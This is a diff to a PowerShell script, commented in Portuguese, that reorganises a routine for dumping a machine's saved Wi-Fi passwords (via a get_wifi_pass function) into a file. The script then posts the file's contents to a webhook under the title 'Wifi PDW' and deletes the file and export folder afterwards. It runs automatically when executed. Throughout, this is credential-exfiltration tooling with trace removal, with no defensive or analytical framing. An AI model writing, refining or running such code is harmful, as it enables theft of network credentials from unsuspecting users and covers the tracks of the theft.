@@ -300,6 +300,8 @@ function send_file_to_webhook {
         [Parameter(Mandatory=$true)]
         [string]$WebhookUrl,                   # URL do webhook para onde enviar
 
+        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo
+
         [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
         [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
     )
@@ -325,15 +327,18 @@ function send_file_to_webhook {
         }
     }
 
-    # Lê bytes
-    try {
-        $bytes = [System.IO.File]::ReadAllBytes($resolvedPath)
-    } catch {
-        throw "Falha ao ler o arquivo '$resolvedPath': $_"
-    }
-
     # Envia e apaga o arquivo após envio
     try {
+        # Lê o conteúdo do arquivo
+        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8
+
+        # Monta a string no formato "Titulo: conteudo"
+        $payloadText = "${Titulo}: ${fileContent}"
+
+        # Converte a string montada para bytes UTF-8
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)
+
+        # Envia a requisição
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'
 
         # Remove o arquivo após envio
@@ -353,38 +358,101 @@ function send_file_to_webhook {
         } catch {
             Write-Verbose "Falha ao remover pasta de exportação: $_"
         }
-        
     }
 
-    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date) }
+    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
 }
 
-# === Execução principal (rodará automaticamente quando o script for executado) ===
-try {
-    $out = get_wifi_pass -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault
-    Write-Host "Arquivo gerado em: $out"
-} catch {
-    Write-Error "Erro ao gerar arquivo: $_"
-    exit 1
-}
 
-if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
+######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
+function Invoke-DataDump {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [scriptblock]$DumpCommand,
+
+        [Parameter(Mandatory = $true)]
+        [string]$OutputFile,
+
+        [Parameter(Mandatory = $false)]
+        [string]$ExportDir
+    )
+
     try {
-        Write-Host "Enviando para webhook: $WebhookUrl"
-        
-        # Garante que a chamada passe os parâmetros corretamente
-        $sendResult = send_file_to_webhook -FilePath $out -WebhookUrl $WebhookUrl -ExportDir $ExportDirDefault
-        
-        # Exibe o resultado checando se o retorno possui as propriedades
-        if ($null -ne $sendResult) {
-            $fileSent = if ($sendResult.PSObject.Properties['FileSent']) { $sendResult.FileSent } else { $out }
-            $timeSent = if ($sendResult.PSObject.Properties['Time']) { $sendResult.Time } else { (Get-Date) }
-            
-            Write-Host "Envio concluído: $fileSent em $timeSent"
-        } else {
-            Write-Host "Envio concluído com sucesso."
+        # Executa o comando passado via ScriptBlock
+        $out = &$DumpCommand
+
+        # Se o comando não retornar o caminho em texto, usa o OutputFile
+        if ([string]::IsNullOrWhiteSpace($out)) {
+            $out =$OutputFile
         }
+
+        Write-Host "Arquivo gerado em: $out"
+        return $out
     } catch {
-        Write-Error "Erro durante envio para webhook: $_"
+        Write-Error "Erro ao gerar arquivo: $_"
+        exit 1
     }
 }
+
+
+####### Enviar ao Webhook ######
+function Send-DumpToWebhook {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [string]$FilePath,
+
+        [Parameter(Mandatory = $false)]
+        [string]$WebhookUrl,
+
+        [Parameter(Mandatory = $false)]
+        [string]$Title = "Relatório de Dump",
+
+        [Parameter(Mandatory = $false)]
+        [string]$ExportDir,
+
+        [Parameter(Mandatory = $false)]
+        [switch]$RemoveExportDir
+    )
+
+    # Executa apenas se a URL do Webhook for informada
+    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
+        try {
+            Write-Host "Enviando para webhook: $WebhookUrl"
+
+            # Monta os parâmetros dinamicamente (Splatting)
+            $splatParams = @{
+                FilePath   = $FilePath
+                WebhookUrl = $WebhookUrl
+                Titulo     = $Title
+            }
+
+            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
+            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }
+
+            # Executa a função interna de envio
+            $sendResult = send_file_to_webhook @splatParams
+
+            # Exibe o resultado checando o retorno do objeto
+            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }
+
+                Write-Host "Envio concluído: $fileSent em$timeSent"
+            } else {
+                Write-Host "Envio concluído com sucesso."
+            }
+        } catch {
+            Write-Error "Erro durante envio para webhook: $_"
+        }
+    }
+}
+
+#### Executa ####
+$out = Invoke-DataDump -DumpCommand { get_wifi_pass -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault
+Send-DumpToWebhook `
+    -FilePath $out `
+    -WebhookUrl $WebhookUrl `
+    -Title "Wifi PDW" `
+    -ExportDir $ExportDirDefault `
+    -RemoveExportDir
+
